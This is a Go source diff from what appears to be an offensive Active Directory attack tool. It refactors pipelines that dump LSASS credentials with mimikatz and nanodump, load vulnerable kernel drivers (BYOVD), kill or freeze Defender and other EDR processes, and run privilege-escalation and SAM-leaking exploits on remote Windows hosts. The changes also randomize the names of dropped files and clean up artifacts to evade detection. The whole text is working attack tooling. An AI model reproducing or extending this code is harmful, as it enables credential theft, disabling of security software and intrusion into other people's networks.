@@ -6,6 +6,8 @@ import (
 	"adpack/utils"
 	"context"
 	"fmt"
+	"os"
+	"path/filepath"
 	"strings"
 	"time"
 	"unicode"
@@ -282,17 +284,24 @@ func executeMimikatzPipeline(state *core.ADState, host core.Host, pipeline Pipel
 
 	fmt.Println("[*] Running go-mimikatz locally...")
 	r, err := tools.GoMimikatz.Sekurlsa(ctx, tools.ExecutionRequest{})
-	if err == nil && r.Success {
-		creds := pipeline.ParseFn(r.Stdout)
-		result.Creds = append(result.Creds, creds...)
-		for _, c := range creds {
-			result.Evidence = append(result.Evidence, core.EvidenceEntry{
-				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-				Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
-				Value: c.Secret, Confidence: 0.7, RawOutput: r.Stdout,
-				Timestamp: time.Now(),
-			})
+	if err != nil || r == nil || !r.Success {
+		result.Success = false
+		if r != nil {
+			result.RawOutput = r.Stdout
 		}
+		return result
+	}
+
+	result.Success = true
+	creds := pipeline.ParseFn(r.Stdout)
+	result.Creds = append(result.Creds, creds...)
+	for _, c := range creds {
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "go-mimikatz", Key: c.Username + "@" + c.Domain,
+			Value: c.Secret, Confidence: 0.7, RawOutput: r.Stdout,
+			Timestamp: time.Now(),
+		})
 	}
 	result.RawOutput = r.Stdout
 	return result
@@ -329,27 +338,32 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 
 		cmd := fmt.Sprintf("nanodump --write %s --fork", remotePath)
 		r, err := tools.NetExec.Run(ctx, target, "-x", []string{cmd})
-		if err != nil || !r.Success {
+		if err != nil {
+			result.Success = false
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+				Source: "nanodump", Key: "error",
+				Value:     "remote execution failed: " + err.Error(),
+				Timestamp: time.Now(),
+			})
+			return result
+		}
+		if !r.Success {
 			fmt.Printf("[!] Remote execution failed: %s\n", r.Stderr)
 			result.Success = false
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 				Source: "nanodump", Key: "error",
-				Value:     "remote execution failed",
+				Value:     "remote execution failed: " + r.Stderr,
 				Timestamp: time.Now(),
 			})
 			return result
 		}
 
 		fmt.Println("[*] Retrieving dump via SMB...")
-		getCmd := fmt.Sprintf(`--get-file %s`, remotePath)
-		getTarget := tools.NetExecTarget{
-			Protocol: "smb", Host: host.IP,
-			Domain: domain, Username: user, Password: pass, Hash: hash,
-		}
-		getR, err := tools.NetExec.Run(ctx, getTarget, getCmd, []string{})
+		localPath := fmt.Sprintf("/tmp/lsass_remote_%d.dmp", time.Now().Unix())
+		getR, err := tools.NetExec.GetFile(ctx, target, remotePath, localPath)
 		if err == nil && getR.Success {
-			localPath := fmt.Sprintf("/tmp/lsass_remote_%d.dmp", time.Now().Unix())
 			fmt.Printf("[*] Parsing dump with pypykatz...\n")
 			parsed, err := tools.Nanodump.ParseDump(ctx, localPath)
 			if err != nil {
@@ -370,13 +384,24 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	r, err := tools.Nanodump.Run(ctx, tools.ExecutionRequest{
 		Evasion: "fork",
 	})
-	if err == nil && r.Success {
-		parsed, err := tools.Nanodump.ParseDump(ctx, ncfg.Output)
-		if err == nil && parsed.Success {
-			creds := pipeline.ParseFn(parsed.Stdout)
-			result.Creds = append(result.Creds, creds...)
+	if err != nil || r == nil || !r.Success {
+		result.Success = false
+		if r != nil {
+			result.RawOutput = r.Stdout
 		}
+		return result
 	}
+
+	parsed, err := tools.Nanodump.ParseDump(ctx, ncfg.Output)
+	if err != nil || !parsed.Success {
+		result.Success = false
+		result.RawOutput = r.Stdout
+		return result
+	}
+
+	result.Success = true
+	creds := pipeline.ParseFn(parsed.Stdout)
+	result.Creds = append(result.Creds, creds...)
 	result.RawOutput = r.Stdout
 	return result
 }
@@ -402,76 +427,81 @@ func executeBYOVDPipeline(state *core.ADState, host core.Host, pipeline Pipeline
 		Domain: domain, Username: user, Password: pass, Hash: hash,
 	}
 
-	fmt.Println("[*] BYOVD: Uploading RTCore64.sys to target...")
 	ctx := context.Background()
-	uploadDrv, err := tools.NetExec.PutFile(ctx, target, "RTCore64.sys", `C:\Windows\Temp\`)
-	if err != nil || !uploadDrv.Success {
-		fmt.Println("[!] Failed to upload RTCore64.sys")
+
+	fmt.Println("[*] BYOVD: Deploying RTCore64.sys (randomized name)...")
+	driverPath, drvSha, err := tools.Deploy(ctx, target, "RTCore64.sys", `C:\Windows\Temp\`, "")
+	if err != nil {
+		fmt.Printf("[!] Failed to deploy RTCore64.sys: %v\n", err)
 		result.Success = false
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "byovd", Key: "error",
-			Value:     "failed to upload RTCore64.sys",
+			Source: "byovd", Key: "error", Value: "driver upload failed: " + err.Error(),
 			Timestamp: time.Now(),
 		})
 		return result
 	}
 
-	fmt.Println("[*] BYOVD: Uploading nanodump.exe to target...")
-	uploadNd, err := tools.NetExec.PutFile(ctx, target, "nanodump.exe", `C:\Windows\Temp\`)
-	if err != nil || !uploadNd.Success {
-		fmt.Println("[!] Failed to upload nanodump.exe")
+	fmt.Println("[*] BYOVD: Deploying nanodump.exe (randomized name)...")
+	dumperPath, _, err := tools.Deploy(ctx, target, "nanodump.exe", `C:\Windows\Temp\`, "")
+	if err != nil {
+		fmt.Printf("[!] Failed to deploy nanodump.exe: %v\n", err)
+		_ = tools.CleanupRemote(ctx, target, driverPath)
 		result.Success = false
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "byovd", Key: "error",
-			Value:     "failed to upload nanodump.exe",
+			Source: "byovd", Key: "error", Value: "nanodump upload failed: " + err.Error(),
 			Timestamp: time.Now(),
 		})
 		return result
 	}
 
-	fmt.Println("[*] BYOVD: Loading driver...")
-	loadDrv, err := tools.NetExec.Run(ctx, target, "-x", []string{
-		`sc create RTCore64 binPath=C:\Windows\Temp\RTCore64.sys type=kernel && sc start RTCore64`,
-	})
-	if err != nil || !loadDrv.Success {
+	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_byovd_%d.dmp`, time.Now().UnixNano())
+
+	// Always clean up driver service registration, dropped binaries, and dump file.
+	// Stop and delete are issued as independent calls so a stop-failure doesn't
+	// short-circuit the delete (which is the operation that actually removes the
+	// service registration from the SCM).
+	defer func() {
+		tools.NetExec.RunFailover(ctx, target, `sc stop RTCore64`, 15*time.Second)
+		time.Sleep(1 * time.Second)
+		tools.NetExec.RunFailover(ctx, target, `sc delete RTCore64`, 15*time.Second)
+		_ = tools.CleanupRemote(ctx, target, driverPath, dumperPath, dumpRemote)
+	}()
+
+	fmt.Printf("[*] BYOVD: Loading kernel driver (sha256:%s…)...\n", tools.ShortHash(drvSha, 16))
+	loadCmd := fmt.Sprintf(`sc create RTCore64 binPath=%s type=kernel && sc start RTCore64`, driverPath)
+	loadDrv, lerr := tools.NetExec.RunFailover(ctx, target, loadCmd, 30*time.Second)
+	if lerr != nil || !loadDrv.Success {
 		fmt.Println("[!] Driver load failed")
 		result.Success = false
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "byovd", Key: "error",
-			Value:     "driver load failed",
+			Source: "byovd", Key: "error", Value: "driver load failed",
 			Timestamp: time.Now(),
 		})
 		return result
 	}
 
-	defer func() {
-		tools.NetExec.Run(ctx, target, "-x", []string{
-			`sc stop RTCore64 && sc delete RTCore64`,
-		})
-	}()
-
-	fmt.Println("[*] BYOVD: Dumping LSASS...")
-	dumpCmd := `C:\Windows\Temp\nanodump.exe --write C:\Windows\Temp\lsass_byovd.dmp --fork`
-	dump, err := tools.NetExec.Run(ctx, target, "-x", []string{dumpCmd})
-	if err != nil || !dump.Success {
+	fmt.Println("[*] BYOVD: Dumping LSASS via nanodump --fork...")
+	dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
+	dump, derr := tools.NetExec.RunFailover(ctx, target, dumpCmd, 60*time.Second)
+	if derr != nil || !dump.Success {
 		fmt.Println("[!] Dump failed")
 		result.Success = false
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "byovd", Key: "error",
-			Value:     "dump failed",
+			Source: "byovd", Key: "error", Value: "dump failed",
 			Timestamp: time.Now(),
 		})
 		return result
 	}
 
 	fmt.Println("[*] BYOVD: Retrieving dump...")
-	getR, err := tools.NetExec.GetFile(ctx, target, `C:\Windows\Temp\lsass_byovd.dmp`, ".")
+	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_byovd_%d.dmp", time.Now().UnixNano()))
+	getR, err := tools.NetExec.GetFile(ctx, target, dumpRemote, localDump)
 	if err == nil && getR.Success {
-		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", "lsass_byovd.dmp")
+		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
 		if pyr.Success {
 			creds := pipeline.ParseFn(pyr.Stdout)
 			result.Creds = append(result.Creds, creds...)
@@ -485,11 +515,6 @@ func executeBYOVDPipeline(state *core.ADState, host core.Host, pipeline Pipeline
 			}
 		}
 	}
-
-	fmt.Println("[*] BYOVD: Stopping driver...")
-	tools.NetExec.Run(ctx, target, "-x", []string{
-		`sc stop RTCore64 && sc delete RTCore64`,
-	})
 	return result
 }
 
@@ -499,16 +524,23 @@ func runDefenderKill(_ *core.ADState, _ core.Host, target tools.NetExecTarget) {
 		return
 	}
 	ctx := context.Background()
-	fmt.Println("[*] Pre-condition: Uploading UnDefend.exe to target...")
-	upload, err := tools.NetExec.PutFile(ctx, target, "UnDefend.exe", `C:\Windows\Temp\`)
-	if err != nil || !upload.Success {
-		fmt.Println("[!] Failed to upload UnDefend.exe, skipping Defender kill")
+
+	fmt.Println("[*] Pre-condition: Deploying UnDefend.exe (randomized name)...")
+	remotePath, hash, err := tools.Deploy(ctx, target, "UnDefend.exe", `C:\Windows\Temp\`, "")
+	if err != nil {
+		fmt.Printf("[!] Failed to deploy UnDefend.exe: %v\n", err)
 		return
 	}
-	fmt.Println("[*] Pre-condition: Executing UnDefend aggressive mode to kill Defender...")
-	killR, _ := tools.UnDefend.ExecRemote(ctx, target, `C:\Windows\Temp\UnDefend.exe`, tools.UnDefendAggressive)
+	fmt.Printf("    sha256: %s…  remote: %s\n", tools.ShortHash(hash, 16), remotePath)
+
+	fmt.Println("[*] Pre-condition: Executing UnDefend aggressive mode (start /B)...")
+	killR, _ := tools.UnDefend.ExecRemote(ctx, target, remotePath, tools.UnDefendAggressive)
 	_ = killR
 	time.Sleep(2 * time.Second)
+
+	if errs := tools.CleanupRemote(ctx, target, remotePath); len(errs) > 0 {
+		fmt.Printf("[!] UnDefend cleanup soft-failed: %v\n", errs[0])
+	}
 }
 
 func executeUnDefendPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
@@ -528,23 +560,27 @@ func executeUnDefendPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	runDefenderKill(state, host, target)
 
 	ctx := context.Background()
-	fmt.Println("[*] UnDefend: Uploading nanodump.exe to target...")
-	uploadNd, err := tools.NetExec.PutFile(ctx, target, "nanodump.exe", `C:\Windows\Temp\`)
-	if err != nil || !uploadNd.Success {
-		fmt.Println("[!] Failed to upload nanodump.exe")
+	fmt.Println("[*] UnDefend: Deploying nanodump.exe (randomized name)...")
+	dumperPath, _, derr := tools.Deploy(ctx, target, "nanodump.exe", `C:\Windows\Temp\`, "")
+	if derr != nil {
+		fmt.Printf("[!] Failed to deploy nanodump.exe: %v\n", derr)
 		result.Success = false
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 			Source: "undefend", Key: "error",
-			Value:     "failed to upload nanodump.exe",
+			Value:     "nanodump upload failed: " + derr.Error(),
 			Timestamp: time.Now(),
 		})
 		return result
 	}
+	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_undefend_%d.dmp`, time.Now().UnixNano())
+	defer func() {
+		_ = tools.CleanupRemote(ctx, target, dumperPath, dumpRemote)
+	}()
 
 	fmt.Println("[*] UnDefend: Dumping LSASS via nanodump --fork...")
-	dumpCmd := `C:\Windows\Temp\nanodump.exe --write C:\Windows\Temp\lsass_undefend.dmp --fork`
-	dump, err := tools.NetExec.Run(ctx, target, "-x", []string{dumpCmd})
+	dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
+	dump, err := tools.NetExec.RunFailover(ctx, target, dumpCmd, 60*time.Second)
 	if err != nil || !dump.Success {
 		fmt.Println("[!] Dump failed")
 		result.Success = false
@@ -558,10 +594,11 @@ func executeUnDefendPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	}
 
 	fmt.Println("[*] UnDefend: Retrieving dump...")
-	getR, err := tools.NetExec.GetFile(ctx, target, `C:\Windows\Temp\lsass_undefend.dmp`, ".")
+	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_undefend_%d.dmp", time.Now().UnixNano()))
+	getR, err := tools.NetExec.GetFile(ctx, target, dumpRemote, localDump)
 	if err == nil && getR.Success {
 		fmt.Println("[*] UnDefend: Parsing dump with pypykatz...")
-		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", "lsass_undefend.dmp")
+		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
 		if pyr.Success {
 			creds := pipeline.ParseFn(pyr.Stdout)
 			result.Creds = append(result.Creds, creds...)
@@ -604,32 +641,51 @@ func executeBlueHammerPipeline(state *core.ADState, host core.Host, pipeline Pip
 		return executeNanodumpPipeline(state, host, pipeline)
 	}
 
-	fmt.Println("[*] BlueHammer: Uploading FunnyApp.exe to target...")
 	ctx := context.Background()
-	upload, err := tools.NetExec.PutFile(ctx, target, "FunnyApp.exe", `C:\Windows\Temp\`)
-	if err != nil || !upload.Success {
-		fmt.Println("[!] Failed to upload FunnyApp.exe")
+	fmt.Println("[*] BlueHammer: Deploying FunnyApp.exe (randomized name)...")
+	remotePath, sha, err := tools.Deploy(ctx, target, "FunnyApp.exe", `C:\Windows\Temp\`, "")
+	if err != nil {
+		fmt.Printf("[!] BlueHammer deploy failed: %v\n", err)
 		result.Success = false
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 			Source: "bluehammer", Key: "error",
-			Value:     "failed to upload FunnyApp.exe",
+			Value:     "deploy failed: " + err.Error(),
 			Timestamp: time.Now(),
 		})
 		return result
 	}
+	defer func() {
+		if errs := tools.CleanupRemote(ctx, target, remotePath); len(errs) > 0 {
+			fmt.Printf("[!] BlueHammer cleanup soft-failed: %v\n", errs[0])
+		}
+	}()
 
-	fmt.Println("[*] BlueHammer: Executing Defender RPC exploit to leak SAM...")
-	execR, err := tools.BlueHammer.ExecRemote(ctx, target, `C:\Windows\Temp\FunnyApp.exe`)
-	if err == nil && execR.Success {
+	fmt.Println("[*] BlueHammer: Executing Defender RPC exploit (start /B)...")
+	execR, err := tools.BlueHammer.ExecRemote(ctx, target, remotePath)
+	if err != nil || execR == nil || !execR.Success {
+		result.Success = false
+		errMsg := "execution failed"
+		if err != nil {
+			errMsg = err.Error()
+		} else if execR != nil {
+			errMsg = execR.Stderr
+		}
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 			Source: "bluehammer", Key: "sam_leak",
-			Value:      "BlueHammer executed. Check target for SAM output.",
-			Confidence: 0.5, RawOutput: execR.Stdout,
-			Timestamp: time.Now(),
+			Value:      "BlueHammer execution failed: " + errMsg,
+			Confidence: 0.0, Timestamp: time.Now(),
 		})
+		return result
 	}
+	result.Evidence = append(result.Evidence, core.EvidenceEntry{
+		Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+		Source: "bluehammer", Key: "sam_leak",
+		Value:      fmt.Sprintf("BlueHammer executed (sha256:%s). Check target for SAM output.", tools.ShortHash(sha, 16)),
+		Confidence: 0.5, RawOutput: execR.Stdout,
+		Timestamp: time.Now(),
+	})
 	return result
 }
 
@@ -652,31 +708,38 @@ func executeColdWerPipeline(state *core.ADState, host core.Host, pipeline Pipeli
 	runDefenderKill(state, host, target)
 
 	ctx := context.Background()
-	fmt.Println("[*] ColdWer: Uploading EDR-Freeze.exe + nanodump.exe to target...")
-	uploadFrz, err := tools.NetExec.PutFile(ctx, target, "EDR-Freeze.exe", `C:\Windows\Temp\`)
-	if err != nil || !uploadFrz.Success {
-		fmt.Println("[!] Failed to upload EDR-Freeze.exe, falling back to nanodump")
+	fmt.Println("[*] ColdWer: Deploying EDR-Freeze.exe (randomized name)...")
+	freezerPath, _, ferr := tools.Deploy(ctx, target, "EDR-Freeze.exe", `C:\Windows\Temp\`, "")
+	if ferr != nil {
+		fmt.Printf("[!] Failed to deploy EDR-Freeze.exe: %v — falling back to nanodump\n", ferr)
 		return executeNanodumpPipeline(state, host, pipeline)
 	}
-	uploadNd, err := tools.NetExec.PutFile(ctx, target, "nanodump.exe", `C:\Windows\Temp\`)
-	if err != nil || !uploadNd.Success {
-		fmt.Println("[!] Failed to upload nanodump.exe")
+	fmt.Println("[*] ColdWer: Deploying nanodump.exe (randomized name)...")
+	dumperPath, _, derr := tools.Deploy(ctx, target, "nanodump.exe", `C:\Windows\Temp\`, "")
+	if derr != nil {
+		fmt.Printf("[!] Failed to deploy nanodump.exe: %v\n", derr)
+		_ = tools.CleanupRemote(ctx, target, freezerPath)
 		result.Success = false
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 			Source: "coldwer", Key: "error",
-			Value:     "failed to upload nanodump.exe",
+			Value:     "nanodump upload failed: " + derr.Error(),
 			Timestamp: time.Now(),
 		})
 		return result
 	}
+	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_frozen_%d.dmp`, time.Now().UnixNano())
+	defer func() {
+		_ = tools.CleanupRemote(ctx, target, freezerPath, dumperPath, dumpRemote)
+	}()
 
 	edrProcs := []string{"MsMpEng.exe", "SentinelAgent.exe", "CrowdStrike.exe",
 		"Cylance.exe", "Sophos.exe", "TaniumClient.exe", "S1.exe"}
 
+	dumped := false
 	for _, proc := range edrProcs {
 		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
-		pidR, err := tools.NetExec.Run(ctx, target, "-x", []string{pidCmd})
+		pidR, err := tools.NetExec.RunFailover(ctx, target, pidCmd, 30*time.Second)
 		if err == nil && pidR.Success && strings.TrimSpace(pidR.Stdout) != "" {
 			pid := strings.TrimSpace(pidR.Stdout)
 			if !isNumeric(pid) {
@@ -684,22 +747,38 @@ func executeColdWerPipeline(state *core.ADState, host core.Host, pipeline Pipeli
 				continue
 			}
 			fmt.Printf("[*] ColdWer: Found %s PID %s, freezing for 3s...\n", proc, pid)
-			freezeCmd := fmt.Sprintf(`C:\Windows\Temp\EDR-Freeze.exe %s 3000`, pid)
-			freeze, err := tools.NetExec.Run(ctx, target, "-x", []string{freezeCmd})
-			if err == nil && freeze.Success {
+			freezeCmd := fmt.Sprintf(`%s %s 3000`, freezerPath, pid)
+			freeze, ferr := tools.NetExec.RunFailover(ctx, target, freezeCmd, 30*time.Second)
+			if ferr == nil && freeze.Success {
 				time.Sleep(1 * time.Second)
 				fmt.Println("[*] ColdWer: Dumping LSASS during freeze window...")
-				dumpCmd := `C:\Windows\Temp\nanodump.exe --write C:\Windows\Temp\lsass_frozen.dmp --fork`
-				tools.NetExec.Run(ctx, target, "-x", []string{dumpCmd})
+				dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
+				dumpR, derr := tools.NetExec.RunFailover(ctx, target, dumpCmd, 60*time.Second)
+				if derr != nil || !dumpR.Success {
+					dumpStderr := dumpR.Stderr
+					if dumpStderr == "" && derr != nil {
+						dumpStderr = derr.Error()
+					}
+					fmt.Printf("[!] ColdWer: dump failed during %s freeze (err=%v, stderr=%q), trying next EDR\n",
+						proc, derr, dumpStderr)
+					continue
+				}
+				dumped = true
 				break
 			}
 		}
 	}
 
-	getR, err := tools.NetExec.GetFile(ctx, target, `C:\Windows\Temp\lsass_frozen.dmp`, ".")
+	if !dumped {
+		fmt.Println("[!] ColdWer: No EDR found to freeze, falling back to nanodump")
+		return executeNanodumpPipeline(state, host, pipeline)
+	}
+
+	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_frozen_%d.dmp", time.Now().UnixNano()))
+	getR, err := tools.NetExec.GetFile(ctx, target, dumpRemote, localDump)
 	if err == nil && getR.Success {
 		fmt.Println("[*] ColdWer: Parsing dump with pypykatz...")
-		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", "lsass_frozen.dmp")
+		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
 		if pyr.Success {
 			creds := pipeline.ParseFn(pyr.Stdout)
 			result.Creds = append(result.Creds, creds...)
@@ -937,38 +1016,50 @@ func executePhantomKillerPipeline(state *core.ADState, host core.Host, pipeline 
 	}
 
 	ctx := context.Background()
-	fmt.Println("[*] PhantomKiller: Uploading BootRepair.sys via SMB...")
-	uploadDriver, err := tools.NetExec.PutFile(ctx, target, "BootRepair.sys", `C:\Windows\Temp\`)
-	if err != nil || !uploadDriver.Success {
-		fmt.Println("[!] Failed to upload BootRepair.sys")
+
+	fmt.Println("[*] PhantomKiller: Deploying BootRepair.sys (randomized name)...")
+	driverPath, drvSha, err := tools.Deploy(ctx, target, "BootRepair.sys", `C:\Windows\Temp\`, "")
+	if err != nil {
+		fmt.Printf("[!] Failed to deploy BootRepair.sys: %v\n", err)
 		result.Success = false
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 			Source: "phantomkiller", Key: "error",
-			Value:     "failed to upload BootRepair.sys",
+			Value:     "driver upload failed: " + err.Error(),
 			Timestamp: time.Now(),
 		})
 		return result
 	}
 
-	fmt.Println("[*] PhantomKiller: Uploading PhantomKiller.exe via SMB...")
-	uploadExe, err := tools.NetExec.PutFile(ctx, target, "PhantomKiller.exe", `C:\Windows\Temp\`)
-	if err != nil || !uploadExe.Success {
-		fmt.Println("[!] Failed to upload PhantomKiller.exe")
+	fmt.Println("[*] PhantomKiller: Deploying PhantomKiller.exe (randomized name)...")
+	killerPath, _, kerr := tools.Deploy(ctx, target, "PhantomKiller.exe", `C:\Windows\Temp\`, "")
+	if kerr != nil {
+		fmt.Printf("[!] Failed to deploy PhantomKiller.exe: %v\n", kerr)
+		_ = tools.CleanupRemote(ctx, target, driverPath)
 		result.Success = false
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 			Source: "phantomkiller", Key: "error",
-			Value:     "failed to upload PhantomKiller.exe",
+			Value:     "killer upload failed: " + kerr.Error(),
 			Timestamp: time.Now(),
 		})
 		return result
 	}
 
-	fmt.Println("[*] PhantomKiller: Loading kernel driver...")
-	loadCmd := `sc.exe create PhantomKiller binPath="C:\Windows\Temp\BootRepair.sys" type=kernel && sc.exe start PhantomKiller`
-	loadR, err := tools.NetExec.Run(ctx, target, "-x", []string{loadCmd})
-	if err != nil || !loadR.Success {
+	// Stop, brief settle delay (services occasionally linger in STOP_PENDING for
+	// a second or two), then delete. Issued as independent calls so a stop
+	// failure doesn't prevent the delete from removing the SCM entry.
+	defer func() {
+		tools.NetExec.RunFailover(ctx, target, `sc.exe stop PhantomKiller`, 15*time.Second)
+		time.Sleep(2 * time.Second)
+		tools.NetExec.RunFailover(ctx, target, `sc.exe delete PhantomKiller`, 15*time.Second)
+		_ = tools.CleanupRemote(ctx, target, driverPath, killerPath)
+	}()
+
+	fmt.Printf("[*] PhantomKiller: Loading kernel driver (sha256:%s…)...\n", tools.ShortHash(drvSha, 16))
+	loadCmd := fmt.Sprintf(`sc.exe create PhantomKiller binPath="%s" type=kernel && sc.exe start PhantomKiller`, driverPath)
+	loadR, lerr := tools.NetExec.RunFailover(ctx, target, loadCmd, 30*time.Second)
+	if lerr != nil || !loadR.Success {
 		fmt.Println("[!] Failed to load PhantomKiller driver")
 		result.Success = false
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
@@ -985,8 +1076,8 @@ func executePhantomKillerPipeline(state *core.ADState, host core.Host, pipeline 
 		"SophosMgr.exe", "TaniumClient.exe", "CarbonBlack.exe", "CrowdStrike.exe", "McAfee.exe", "Symantec.exe"}
 	for _, proc := range edrProcs {
 		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
-		pidR, err := tools.NetExec.Run(ctx, target, "-x", []string{pidCmd})
-		if err == nil && pidR.Success && strings.TrimSpace(pidR.Stdout) != "" {
+		pidR, perr := tools.NetExec.RunFailover(ctx, target, pidCmd, 30*time.Second)
+		if perr == nil && pidR.Success && strings.TrimSpace(pidR.Stdout) != "" {
 			pid := strings.TrimSpace(pidR.Stdout)
 			if !isNumeric(pid) {
 				fmt.Printf("[!] PhantomKiller: Invalid PID from remote: %q, skipping\n", pid)
@@ -996,7 +1087,7 @@ func executePhantomKillerPipeline(state *core.ADState, host core.Host, pipeline 
 			pidInt := 0
 			fmt.Sscanf(pid, "%d", &pidInt)
 			if pidInt > 0 {
-				killR, _ := tools.PhantomKiller.ExecRemote(ctx, target, `C:\Windows\Temp\PhantomKiller.exe`, tools.PhantomKillerModeKill, pidInt)
+				killR, _ := tools.PhantomKiller.ExecRemote(ctx, target, killerPath, tools.PhantomKillerModeKill, pidInt)
 				_ = killR
 			}
 		}
@@ -1004,9 +1095,9 @@ func executePhantomKillerPipeline(state *core.ADState, host core.Host, pipeline 
 
 	fmt.Println("[*] PhantomKiller: Dumping LSASS with nanodump...")
 	dump := executeNanodumpPipeline(state, host, pipeline)
-	if dump.Success {
-		result.Evidence = append(result.Evidence, dump.Evidence...)
-	}
+	result.Success = dump.Success
+	result.Evidence = append(result.Evidence, dump.Evidence...)
+	result.Creds = append(result.Creds, dump.Creds...)
 
 	return result
 }
@@ -1038,68 +1129,99 @@ func executeMiniPlasmaPipeline(state *core.ADState, host core.Host, pipeline Pip
 	}
 
 	ctx := context.Background()
-	fmt.Println("[*] MiniPlasma: Uploading exploit via SMB...")
-	upload, err := tools.NetExec.PutFile(ctx, target, "MiniPlasma.exe", `C:\Windows\Temp\`)
-	if err != nil || !upload.Success {
-		fmt.Println("[!] Failed to upload MiniPlasma.exe")
+
+	fmt.Println("[*] MiniPlasma: Deploying dependency DLLs (NtApiDotNet + TaskScheduler)...")
+	var depPaths []string
+	for _, lib := range []string{"NtApiDotNet.dll", "Microsoft.Win32.TaskScheduler.dll"} {
+		rp, _, err := tools.Deploy(ctx, target, lib, `C:\Windows\Temp\`, "")
+		if err != nil {
+			fmt.Printf("[!] MiniPlasma dep %s deploy failed: %v\n", lib, err)
+			_ = tools.CleanupRemote(ctx, target, depPaths...)
+			result.Success = false
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+				Source: "miniplasma", Key: "deploy_error",
+				Value:     lib + " deploy failed: " + err.Error(),
+				Timestamp: time.Now(),
+			})
+			return result
+		}
+		depPaths = append(depPaths, rp)
+	}
+
+	fmt.Println("[*] MiniPlasma: Deploying MiniPlasma.exe (randomized name)...")
+	exploitPath, expSha, err := tools.Deploy(ctx, target, "MiniPlasma.exe", `C:\Windows\Temp\`, "")
+	if err != nil {
+		fmt.Printf("[!] Failed to deploy MiniPlasma.exe: %v\n", err)
+		_ = tools.CleanupRemote(ctx, target, depPaths...)
 		result.Success = false
 		result.Evidence = append(result.Evidence, core.EvidenceEntry{
 			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
 			Source: "miniplasma", Key: "error",
-			Value:     "failed to upload MiniPlasma.exe",
+			Value:     "exploit upload failed: " + err.Error(),
 			Timestamp: time.Now(),
 		})
 		return result
 	}
 
-	fmt.Println("[*] MiniPlasma: Uploading nanodump.exe for SYSTEM-level dump...")
-	uploadNd, err := tools.NetExec.PutFile(ctx, target, "nanodump.exe", `C:\Windows\Temp\`)
-	if err != nil || !uploadNd.Success {
-		fmt.Println("[!] Failed to upload nanodump.exe, falling back to nanodump pipeline")
+	fmt.Println("[*] MiniPlasma: Deploying nanodump.exe (randomized name)...")
+	dumperPath, _, derr := tools.Deploy(ctx, target, "nanodump.exe", `C:\Windows\Temp\`, "")
+	if derr != nil {
+		fmt.Printf("[!] Failed to deploy nanodump.exe: %v — falling back to nanodump pipeline\n", derr)
+		_ = tools.CleanupRemote(ctx, target, append(depPaths, exploitPath)...)
 		return executeNanodumpPipeline(state, host, pipeline)
 	}
 
-	fmt.Println("[*] MiniPlasma: Executing Cloud Filter EoP exploit for SYSTEM shell...")
-	execR, err := tools.NetExec.Run(ctx, target, "-x", []string{`C:\Windows\Temp\MiniPlasma.exe`})
-	if err == nil && execR.Success {
-		fmt.Println("[+] MiniPlasma: SYSTEM shell obtained, dumping LSASS as SYSTEM...")
